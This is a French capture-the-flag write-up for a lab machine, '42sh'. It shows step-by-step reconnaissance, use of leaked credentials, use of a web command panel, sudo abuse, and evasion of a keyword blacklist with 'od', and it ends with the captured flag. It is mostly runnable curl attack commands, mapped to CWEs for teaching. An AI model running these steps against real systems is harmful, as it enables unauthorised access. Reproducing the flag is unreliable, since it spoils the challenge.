# Write-up : "42sh"

**Cible :** 10.10.0.30
**Objectif :** Obtenir user.txt
**Difficulté :** Easy / Medium
**Techniques utilisées :** Reconnaissance réseau, OSINT/énumération web, brute force de répertoires, contournement de blacklist, escalade de privilèges via sudo
**Outils utilisés :** nmap, curl, gobuster, sshpass, xxd, nc

---

## 1. Reconnaissance réseau (Nmap)

**Commande :**

```bash
nmap -sV -p- 10.10.0.30
```

**Pourquoi :** scan complet de tous les ports TCP pour identifier les services exposés avant toute tentative d'exploitation.

**Résultat :**

- `22/tcp` : SSH (OpenSSH 10.0p2 Debian)
- `80/tcp` : HTTP (Apache 2.4.68)

---

## 2. Exploration de la page web principale

**Commande :**

```bash
curl -i http://10.10.0.30/
```

**Résultat :** une page HTML basique ("my 42sh") contenant un commentaire caché dans le code source :

```html
<!--
STOP READING if you're not me!
Remember username: d4rk_T1t0u4N
-->
```

**Faille exploitée :** Exposition d'informations sensibles dans le code source HTML (CWE-200 : Exposure of Sensitive Information) — un commentaire de développement oublié révèle un identifiant.

---

## 3. Découverte d'un chemin caché via robots.txt

**Commande :**

```bash
curl -s http://10.10.0.30/robots.txt
```

**Résultat :**

```
User-agent: *
Disallow: /1337_53CR37_l41r
```

**Faille exploitée :** robots.txt mal utilisé comme mécanisme de sécurité (CWE-548 : Exposure of Information Through Directory Listing) — `robots.txt` est une convention pour les moteurs de recherche, pas un contrôle d'accès ; il révèle ici l'existence d'un chemin qu'on n'aurait jamais deviné.

**Commande :**

```bash
curl -i http://10.10.0.30/1337_53CR37_l41r/
```

**Résultat :** une page révélant le mot de passe associé :

```html
<p>Just in case I forgot, password to my super future 42sh: 8ES7_SHeLL_Ev4H</p>
```

---

## 4. Tentative infructueuse d'authentification SSH

```bash
ssh d4rk_T1t0u4N@10.10.0.30
# password: 8ES7_SHeLL_Ev4H → Permission denied
```

Plusieurs vérifications ont été menées pour écarter les fausses pistes :

```bash
sshpass -p '8ES7_SHeLL_Ev4H' ssh -v d4rk_T1t0u4N@10.10.0.30   # ré-essai propre, sans erreur de frappe
curl -s http://10.10.0.30/1337_53CR37_l41r/ | grep -A1 -i password | xxd   # vérifier l'absence de caractères invisibles
nc -zv -w3 10.10.0.30 22   # vérifier l'absence de ban fail2ban après plusieurs échecs
```

**Conclusion :** les identifiants trouvés n'étaient pas destinés à SSH mais à un service web qu'il restait à découvrir.

---

## 5. Découverte de l'interface web cachée (brute-force de répertoires)

**Commande :**

```bash
gobuster dir -u http://10.10.0.30/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,zip,bak -t 30
```

**Résultat :**

```
login.php     (Status: 200)
portal.php    (Status: 302) → /login.php
forbidden.php (Status: 302) → /login.php
```

**Faille exploitée :** Pages non référencées mais accessibles ("security by obscurity") (CWE-425 : Direct Access to a Resource) — les fichiers `.php` n'étaient liés depuis aucune page mais restaient accessibles publiquement.

---

## 6. Authentification sur le formulaire web

**Inspection du formulaire :**

```bash
curl -s http://10.10.0.30/login.php
```

→ champs `username`, `password`, bouton `sub`.

**Connexion :**

```bash
curl -s -c cookies.txt -X POST http://10.10.0.30/login.php \
  -d "username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login" \
  -i
```

**Résultat :** `HTTP/1.1 302 Found` avec redirection vers `/portal.php` → authentification réussie, cookie de session `PHPSESSID` obtenu.

```bash
curl -s -c cookies.txt -b cookies.txt http://10.10.0.30/portal.php
```

---

## 7. Accès au panneau "Shell" (exécution de commandes distante légitime)

**Résultat :** une interface Shell Panel avec un champ `command` qui exécute des commandes système et affiche le résultat dans une balise `<pre>`.

**Faille exploitée :** Exécution de commandes arbitraires exposée (Remote Command Execution volontaire mais faiblement filtrée) (CWE-78 : Improper Neutralization of Special Elements used in an OS Command) — la fonctionnalité elle-même est une porte d'entrée pour l'exécution de commandes système.

**Test :**

```bash
curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
  --data-urlencode "command=whoami" \
  --data-urlencode "sub=Execute"
```

→ résultat : `www-data`

---

## 8. Reconnaissance système via le Shell Panel

```bash
curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
  --data-urlencode "command=find /var/www -type f" \
  --data-urlencode "sub=Execute"

curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
  --data-urlencode "command=ls -la /home" \
  --data-urlencode "sub=Execute"
```

**Résultat clé :**

```
drwx------ 1 titouan titouan 4096 Aug 27 09:35 titouan
```

→ le répertoire personnel de `titouan` (700, inaccessible à `www-data`) contient probablement `user.txt`.

---

## 9. Escalade de privilèges via sudo -l

```bash
curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
  --data-urlencode "command=sudo -l" \
  --data-urlencode "sub=Execute"
```

**Résultat :**

```
User www-data may run the following commands on h4xx0r_pc:
    (titouan) NOPASSWD: ALL
```

**Faille exploitée :** Règle sudo excessivement permissive (CWE-269 : Improper Privilege Management) — `www-data` peut exécuter n'importe quelle commande en tant que `titouan`, sans mot de passe, ce qui annule toute la protection des permissions du dossier `/home/titouan`.

---

## 10. Contournement du filtre de mots-clés

**Première tentative bloquée :**

```bash
curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
  --data-urlencode "command=sudo -u titouan cat /home/titouan/user.txt" \
  --data-urlencode "sub=Execute"
```

→ _"Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious"_ (le mot-clé `cat` est filtré côté serveur)

**Faille exploitée :** Filtrage par liste noire (blacklist) de commandes, contournable (CWE-184 : Incomplete List of Disallowed Inputs) — bloquer `cat` sans bloquer les dizaines d'alternatives permettant de lire un fichier est une protection illusoire.

**Contournement avec `od` (non filtré) :**

```bash
curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
  --data-urlencode "command=sudo -u titouan od -c /home/titouan/user.txt" \
  --data-urlencode "sub=Execute"
```

**Résultat :**

```
0000000   E   P   I   {   7   1   m   e   _   7   0   _   D   0   _   7
0000020   H   0   5   E   _   N   c   u   R   5   e   2   }  \n
```

**FLAG obtenu :**

```
EPI{71me_70_D0_7H05E_NcuR5e2}
```

---

## Résumé des failles exploitées

| #   | Faille                                                         | Catégorie (CWE)                                | Impact                                           |
| --- | -------------------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------ |
| 1   | Commentaire HTML révélant un identifiant                       | CWE-200 (Exposure of Sensitive Information)    | Fuite du username                                |
| 2   | robots.txt utilisé comme "sécurité" pour cacher un chemin      | CWE-548 (Directory listing / exposure)         | Découverte d'un chemin contenant le mot de passe |
| 3   | Pages PHP accessibles sans lien depuis le site                 | CWE-425 (Direct Access to a Resource)          | Découverte de login.php / portal.php             |
| 4   | Panneau d'exécution de commandes exposé après authentification | CWE-78 (OS Command Injection / RCE volontaire) | Exécution de commandes en tant que www-data      |
| 5   | Règle sudo `(titouan) NOPASSWD: ALL` pour www-data             | CWE-269 (Improper Privilege Management)        | Passage www-data → titouan sans mot de passe     |
| 6   | Filtrage par liste noire de mots-clés (cat bloqué)             | CWE-184 (Incomplete List of Disallowed Inputs) | Contournement trivial avec od, head, etc.        |

---

## Chaîne d'exploitation (résumé visuel)

```
Commentaire HTML caché
        │
        ▼
Username trouvé (d4rk_T1t0u4N)
        │
        ▼
robots.txt → chemin caché /1337_53CR37_l41r/
        │
        ▼
Password trouvé (8ES7_SHeLL_Ev4H)
        │
        ▼
Brute-force de répertoires (gobuster) → login.php / portal.php
        │
        ▼
Authentification sur le formulaire web (PAS SSH)
        │
        ▼
Accès au "Shell Panel" → RCE en tant que www-data
        │
        ▼
sudo -l → (titouan) NOPASSWD: ALL
        │
        ▼
Contournement du filtre "cat" avec "od -c"
        │
        ▼
Lecture de /home/titouan/user.txt → FLAG
```

---

## Conclusion

- **Accès initial :** énumération OSINT (commentaire HTML + robots.txt) → identifiants web.
- **Accès applicatif :** authentification sur `login.php` → accès au Shell Panel → RCE en tant que `www-data`.
- **Escalade de privilèges :** règle sudo `NOPASSWD: ALL` vers `titouan`, contournement du filtre de mots-clés avec `od`.
- **Flag user :** `EPI{71me_70_D0_7H05E_NcuR5e2}` obtenu dans `/home/titouan/user.txt`.
